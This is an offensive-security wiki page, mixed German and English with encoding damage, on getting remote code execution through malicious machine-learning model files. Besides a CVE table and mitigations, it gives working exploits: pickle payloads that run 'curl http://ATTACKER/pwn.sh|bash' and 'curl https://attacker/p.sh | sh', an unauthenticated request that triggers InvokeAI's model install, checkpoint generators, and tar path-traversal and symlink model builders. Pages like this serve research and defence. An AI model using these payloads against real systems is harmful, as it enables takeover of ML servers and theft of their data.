# Modelle RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laden f√ºr RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerabilit√§t (CVE falls verf√ºgbar)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | B√∂sartiges pickle im Model-Checkpoint f√ºhrt zu Codeausf√ºhrung (Umgehung der `weights_only`-Sicherung)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + b√∂sartiger Model-Download verursacht Codeausf√ºhrung; Java-Deserialisierungs-RCE in der Management-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint-Deserialisierung via `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauensw√ºrdiger Checkpoint l√∂st den Pickle-Reducer w√§hrend `load_model_trainer_states_from_checkpoint` aus ‚Üí Codeausf√ºhrung im ML-Worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausf√ºhrung) <br> Laden eines Modells mit **Lambda**-Layer f√ºhrt beliebigen Python-Code aus          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Manipuliertes `.tflite`-Modell l√∂st Integer-Overflow aus ‚Üí Heap-Korruption (potenzielles RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Das Laden eines Modells via `joblib.load` f√ºhrt Pickle mit der `__reduce__`-Payload des Angreifers aus                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                              | `numpy.load` erlaubte standardm√§√üig pickled Object-Arrays ‚Äì b√∂sartige `.npy/.npz` l√∂st Codeausf√ºhrung aus                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Verzeichnis-Traversal) <br> **CVE-2024-5187** (Tar-Traversal)                                                    | Der external-weights-Pfad eines ONNX-Modells kann das Verzeichnis verlassen (beliebige Dateien lesen) <br> B√∂sartiges ONNX-Modell-Tar kann beliebige Dateien √ºberschreiben (f√ºhrt zu RCE) | |
| ONNX Runtime (design risk)  | *(Kein CVE)* ONNX custom ops / control flow                                                                                    | Modelle mit custom-Operatoren erfordern das Laden nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuf√ºhren   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Pfad-Traversal)                                                                                          | Die Verwendung der model-load-API mit aktivierter `--model-control` erlaubt relative Pfad-Traversal zum Schreiben von Dateien (z. B. √úberschreiben von `.bashrc` f√ºr RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 ‚Ä¶ 25668** (mehrere Heap-Overflows)                                                                         | Fehlerhafte GGUF-Modell-Datei verursacht Heap-Buffer-Overflows im Parser, erm√∂glicht beliebige Codeausf√ºhrung auf dem Opfer-System                     | |
| **Keras (older formats)**   | *(Kein neuer CVE)* Legacy Keras H5 model                                                                                         | B√∂sartiges HDF5 (`.h5`) Modell mit Lambda-Layer-Code wird beim Laden weiterhin ausgef√ºhrt (Keras safe_mode deckt altes Format nicht ab ‚Äì ‚ÄûDowngrade-Angriff‚Äù) | |
| **Others** (general)        | *Designfehler* ‚Äì Pickle-Serialisierung                                                                                         | Viele ML-Tools (z. B. Pickle-basierte Modellformate, Python `pickle.load`) f√ºhren eingebetteten beliebigen Code in Modell-Dateien aus, sofern nicht mitigiert | |

Zudem gibt es einige python-pickle-basierte Modelle wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die dazu verwendet werden k√∂nnen, beliebigen Code auf dem System auszuf√ºhren, wenn sie nicht mit `weights_only=True` geladen werden. Daher k√∂nnen beliebige pickle-basierte Modelle besonders anf√§llig f√ºr diese Art von Angriffen sein, auch wenn sie nicht in der obigen Tabelle aufgef√ºhrt sind.

### üÜï  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfl√§che f√ºr Stable-Diffusion. Versionen **5.3.1 ‚Äì 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, der es Nutzern erlaubt, Modelle von beliebigen URLs herunterzuladen und zu laden.

Intern ruft der Endpunkt schlie√ülich auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die bereitgestellte Datei ein **PyTorch checkpoint (`*.ckpt`)** ist, f√ºhrt `torch.load` eine **pickle deserialization** durch. Da der Inhalt direkt von der user-controlled URL stammt, kann ein Angreifer ein b√∂sartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in das Checkpoint einbetten; die Methode wird **during deserialization** ausgef√ºhrt, was zu **remote code execution (RCE)** auf dem InvokeAI server f√ºhrt.

Die Schwachstelle wurde **CVE-2024-12029** zugewiesen (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Stelle `payload.ckpt` auf einem HTTP-Server bereit, den du kontrollierst (z. B. `http://ATTACKER/payload.ckpt`).
3. Trigger das verwundbare endpoint (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterl√§dt, ruft es `torch.load()` auf ‚Üí das `os.system`-Gadget wird ausgef√ºhrt und der Angreifer erh√§lt Codeausf√ºhrung im Kontext des InvokeAI-Prozesses.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.

#### Bedingungen

‚Ä¢  InvokeAI 5.3.1-5.4.2 (scan-Flag standardm√§√üig **false**)  
‚Ä¢  `/api/v2/models/install` vom Angreifer erreichbar  
‚Ä¢  Der Prozess hat Berechtigungen, Shell-Befehle auszuf√ºhren

#### Gegenma√ünahmen

* Auf **InvokeAI ‚â• 5.4.3** aktualisieren ‚Äì der Patch setzt `scan=True` standardm√§√üig und f√ºhrt Malware-Scans vor der Deserialisierung durch.  
* Beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` verwenden oder die neue [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) Hilfsfunktion nutzen.  
* Erzwingen Sie Allow-Lists / Signaturen f√ºr Modellquellen und betreiben Sie den Dienst mit geringsten Privilegien.

> ‚ö†Ô∏è Denken Sie daran, dass **jedes** auf Python-Pickle basierende Format (einschlie√ülich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) inh√§rent unsicher ist, wenn es von nicht vertrauensw√ºrdigen Quellen deserialisiert wird.

---

Beispiel f√ºr eine Ad-hoc-Gegenma√ünahme, falls Sie √§ltere InvokeAI-Versionen hinter einem Reverse-Proxy betreiben m√ºssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### üÜï NVIDIA Merlin Transformers4Rec RCE durch unsicheres `torch.load` (CVE-2025-23298)

NVIDIAs Transformers4Rec (Teil von Merlin) enthielt einen unsicheren Checkpoint-Loader, der direkt `torch.load()` auf benutzerbereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter Checkpoint w√§hrend der Deserialisierung √ºber einen Reducer beliebigen Code ausf√ºhren.

Verwundbarer Pfad (vor Fix): `transformers4rec/torch/trainer/trainer.py` ‚Üí `load_model_trainer_states_from_checkpoint(...)` ‚Üí `torch.load(...)`.

Warum das zu RCE f√ºhrt: Im Python-pickle kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der ein callable und Argumente zur√ºckgibt. Das callable wird w√§hrend des Unpicklings ausgef√ºhrt. Wenn ein solches Objekt in einem Checkpoint vorhanden ist, l√§uft es, bevor irgendwelche Gewichte verwendet werden.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models, die √ºber repos, buckets oder artifact registries geteilt werden
- Automatisierte resume/deploy pipelines, die Checkpoints automatisch laden
- Die Ausf√ºhrung findet innerhalb von training/inference workers statt, oft mit erh√∂hten Rechten (z. B. root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte das direkte `torch.load()` durch einen eingeschr√§nkten, allow-listed Deserializer, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass willk√ºrliche callables w√§hrend des Ladevorgangs aufgerufen werden.

Defensive guidance specific to PyTorch checkpoints:
- Unpickle keine nicht vertrauensw√ºrdigen Daten. Bevorzugen Sie nicht-exekutierbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX, wenn m√∂glich.
- Wenn Sie PyTorch-Serialization verwenden m√ºssen, stellen Sie sicher, dass `weights_only=True` (unterst√ºtzt in neueren PyTorch-Versionen) oder verwenden Sie einen benutzerdefinierten allow-listed unpickler √§hnlich dem Transformers4Rec-Patch.
- Erzwingen Sie Model-Provenance/Signaturen und sandboxen Sie die Deserialisierung (seccomp/AppArmor; non-root user; eingeschr√§nktes FS und kein network egress).
- √úberwachen Sie beim Laden von Checkpoints auf unerwartete Child-Prozesse von ML-Services; trace `torch.load()`/`pickle`-Nutzung.

POC and vulnerable/patch references:
- Verwundbarer Pre-Patch-Loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example ‚Äì crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modell laden:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialisierung Tencent FaceDetection-DSFD `resnet` (CVE-2025-13715 / ZDI-25-1183)

Tencents FaceDetection-DSFD stellt einen `resnet`-Endpoint bereit, der von Benutzern kontrollierte Daten deserialisiert. ZDI best√§tigte, dass ein entfernter Angreifer ein Opfer dazu bringen kann, eine b√∂sartige Seite/Datei zu laden, diese ein speziell gestaltetes serialisiertes blob an diesen Endpoint senden zu lassen und dadurch die Deserialisierung als `root` auszul√∂sen, was zur vollst√§ndigen Kompromittierung f√ºhrt.

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## Modelle zu Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

Zum Beispiel k√∂nnen Sie mit dem folgenden Code ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` anlegt:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder, mit dem folgenden Code kannst du ein Modell erstellen, das beim Laden einen symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Tiefenanalyse: Keras .keras deserialization and gadget hunting

F√ºr einen fokussierten Leitfaden zu .keras-Interna, Lambda-layer RCE, dem arbitrary import issue in ‚â§ 3.8 und der post-fix gadget discovery innerhalb der allowlist siehe:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referenzen

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialisierung von nicht vertrauensw√ºrdigen Daten"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit-Moduldokumentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì Sicherheits√ºberlegungen f√ºr torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog ‚Äì CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI Advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
